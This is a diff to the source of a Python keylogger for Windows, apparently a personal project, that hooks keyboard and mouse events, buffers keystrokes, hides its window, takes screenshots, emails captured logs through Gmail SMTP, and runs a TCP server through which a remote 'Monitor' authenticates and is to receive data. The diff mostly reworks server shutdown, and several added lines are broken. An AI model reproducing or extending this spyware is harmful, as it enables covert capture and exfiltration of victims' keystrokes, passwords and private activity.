@@ -79,6 +79,7 @@ import win32gui
 import winreg
 import wx
 
+
 ########################################################
 # CONSTANTES - CONSTANTS
 ########################################################
@@ -101,6 +102,10 @@ SERVER_MAX_CLIENTS = 5
 MAGIC_MESSAGE = '4ScauMiJcywpjAO/OfC2xLGsha45KoX5AhKR7O6T+Iw='
 MAGIC_RESPONSE_PLAIN = APPNAME + VERSION
 ENCODING = 'utf-8'
+
+# Monitor constants
+DEFAULT_MONITOR_PORT = 7777
+
 
 ########################################################
 # VARIABLES GLOBALES - GLOBAL VARIABLES
@@ -135,10 +140,15 @@ threadLock = threading.Lock()
 threadList = []
 
 # TCP Server control
-# Cuando el servidor tiene un cliente activo tiene el valor True
-# When Server has a connected client this variable is True
+server_shutdown = False                 # When the server is killed it is set to True
 server_has_client = False               # Client connected ?
-client = None                           # This is a thread object of Client
+client_thread = None                    # This is a thread object of Client
+server = None                           # Server object instance
+
+# Send to Monitor control variables
+monitor_enable_send = False
+monitor_ip = None
+monitor_port = DEFAULT_MONITOR_PORT
 
 
 ########################################################
@@ -180,28 +190,32 @@ class ClientThread(threading.Thread):
         self.ip = ip
         self.port = port
         self.response = base64.b64encode(bytes(MAGIC_RESPONSE_PLAIN,ENCODING))
+        # self.response = bytes(MAGIC_RESPONSE_PLAIN,ENCODING)
 
     def run(self):
         msg = 'Recibida petición de Monitor desde ' + str(self.ip) + ":" + str(self.port)
         log_verbose(msg, logging.INFO, 1)
 
-        while True:
-            data = str(self.conn.recv(2048).decode)
-            msg = 'Se ha recibido: ' + data
+        # Process data / message
+        data = self.conn.recv(SERVER_BUFFER_SIZE).decode(ENCODING).rstrip()
+        msg = 'Se ha recibido: ' + data
+        log_verbose(msg, logging.DEBUG, 2)
+        if data == MAGIC_MESSAGE:
+            msg = 'Mensaje correcto. Conexion establecida. Respondiendo {} {}'.format(MAGIC_RESPONSE_PLAIN, self.response)
             log_verbose(msg, logging.DEBUG, 2)
-            if data == MAGIC_MESSAGE:
-                msg = 'Mensaje correcto. Conexion establecida'
-                self.conn.send(MAGIC_RESPONSE_PLAIN)
-                log_verbose(msg, logging.DEBUG, 2)
-                # Inicia comunicación inversa para enviar datos al Monitor
-                # Starts reverse comunication to send data to Monitor
-                # ... pending ...
-            else:
-                msg = 'No tiene permiso'
-                self.conn.send(bytes(msg,ENCODING))
-                log_verbose(msg, logging.DEBUG, 2)
-                # Cerrar conexion ???
-                # ... pending ... ???
+            self.conn.sendall(self.response)
+            msg = 'Voy a iniciar conexion a {}:{}'.format(self.ip, monitor_port)
+            log_verbose(msg, logging.DEBUG, 2)
+            # Inicia comunicación inversa para enviar datos al Monitor
+            # Starts reverse comunication to send data to Monitor
+            # ... pending ...
+        else:
+            msg = 'No tiene permiso'
+            self.conn.sendall(msg).encode(ENCODING)
+            log_verbose(msg, logging.DEBUG, 2)
+
+        self.conn.close()
+
 
 
 class ServerListenerThread(threading.Thread):
@@ -211,23 +225,40 @@ class ServerListenerThread(threading.Thread):
         self.ip = ip
         self.port = port
         self.buffer_size = buffer_size
-        self.threads = []
+        self.client_threads = []
+        self.server_socket = None
 
     def run(self):
-        tcpServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        tcpServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        tcpServer.bind((self.ip, self.port))
+        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.server_socket.bind((self.ip, self.port))
         msg = APPNAME + ' ' + VERSION + ' : Iniciado servidor en ' + str(self.ip) + ' puerto ' + str(self.port)
         log_verbose(msg, logging.INFO, 1)
 
-        while True:
-            tcpServer.listen(SERVER_MAX_CLIENTS)    # 5 clients are more than enough. Normally there is only 1 monitor.
-            msg = 'Esperando conexión del Monitor...'
+        while not server_shutdown:
+            self.server_socket.listen(SERVER_MAX_CLIENTS)       # 5 clients are more than enough.
+            msg = 'Esperando conexión del Monitor...'           # Normally there is only 1 monitor.
             log_verbose(msg, logging.INFO, 1)
-            (conn, (ip, port)) = tcpServer.accept()
-            new_thread = ClientThread(conn, ip, port)
-            new_thread.start()
-            self.threads.append(new_thread)         # Inicia thread de respuesta - Starts client response thread
+            try:
+                (conn, (ip, port)) = self.server_socket.accept()
+            except Exception as e:
+                msg = 'Error recibiendo datos de cliente. Excepcion {} '.format(e)
+                log_verbose(msg, logging.ERROR, 2)
+                break                               # Possibly closed server
+
+            # Inicia thread de respuesta - Starts client response thread
+            client = ClientThread(conn, ip, port)
+            client.start()
+            self.client_threads.append(client)
+
+        # Make sure the server is turned off.
+        try:
+            log_verbose('Shutting Down Server', logging.INFO, 1)
+            self.server_socket.shutdown(socket.SHUT_RDWR)
+            self.server_socket.close()
+        except Exception as e:
+            log_verbose('Server already closed', logging.DEBUG, 2)
+            log_verbose('Exception {}'.format(e), logging.DEBUG, 2)
 
 
 ########################################################
@@ -255,6 +286,31 @@ def log_verbose(msg, log_level, verbose_level):
             print(msg)
     except Exception as ex:
         print("Exception %s " % (ex))
+
+
+# Kill Server and associated clients
+def kill_server_clients():
+    global server, server_shutdown
+
+    if not server_shutdown and server is not None:
+        # Kill clients
+        for client in server.clients_threads:
+            try:
+                client.close()
+            except Exception as e:
+                log_verbose('Error Killing client. Exception {}'.format(e), logging.ERROR, 2)
+
+        # Kill Server
+        try:
+            log_verbose('Shutdown server', logging.INFO, 2)
+            server.server_socket.shutdown(socket.SHUT_RDWR)
+            server.server_socket.close()
+        except Exception as e:
+            log_verbose('Server already closed', logging.DEBUG, 2)
+            log_verbose('Exception {}'.format(e), logging.ERROR, 2)
+
+        server_shutdown = True
+        server = None
 
 
 # función que hace "paste" del contenido del fichero de keylog
@@ -293,17 +349,17 @@ def send_email(message):
         email_password = '****'
 
         # Enviando el correo
-        server = smtplib.SMTP('smtp.gmail.com:587')
-        server.starttls()
-        server.login(email_username, email_password)
-        server.sendmail(email_from_addr, email_to_addrs, message)
+        server_mail = smtplib.SMTP('smtp.gmail.com:587')
+        server_mail.starttls()
+        server_mail.login(email_username, email_password)
+        server_mail.sendmail(email_from_addr, email_to_addrs, message)
 
     except Exception as ex:
         msg = 'No he podido enviar mensaje (' + ex + ')'
         log_verbose(msg, logging.ERROR, 1)
 
     finally:
-        server.quit()
+        server_mail.quit()
 
 
 # Oculta la ventana de la aplicación - Hide the application window
@@ -472,8 +528,8 @@ def add_key_to_buffer(event):
     return True
 
 
-# control eventos de ratón
-# no se registran eventos de raton excepto los cambios de ventana
+# Control eventos de ratón. No se registran eventos de raton excepto los cambios de ventana
+# Mouse events control. No mouse events are recorded except window changes
 def on_mouse_event(event):
     global old_event
 
@@ -484,7 +540,8 @@ def on_mouse_event(event):
     old_event = event
     return 1            # IMPORTANT. An integer other than 0 must be returned
 
-# control eventos de teclado
+
+# Control eventos de teclado - Keyboard events control
 def on_keyboard_event(event):
     global key_buffer, key_counter, old_event
 
@@ -532,6 +589,7 @@ def on_keyboard_event(event):
 
     return 1            # IMPORTANT. An integer other than 0 must be returned
 
+
 # Función que ejecutará al cerrar el programa - Whe program is closed
 def on_close_program():
     global key_buffer, threadList
@@ -550,6 +608,9 @@ def on_close_program():
 
     # ejecuta captura de pantalla - do a screenshot
     capture_screen()
+
+    # kill server
+    kill_server()
 
     # espera que finalicen todos los threads que pueda haber activos
     # wait to all threads are finished
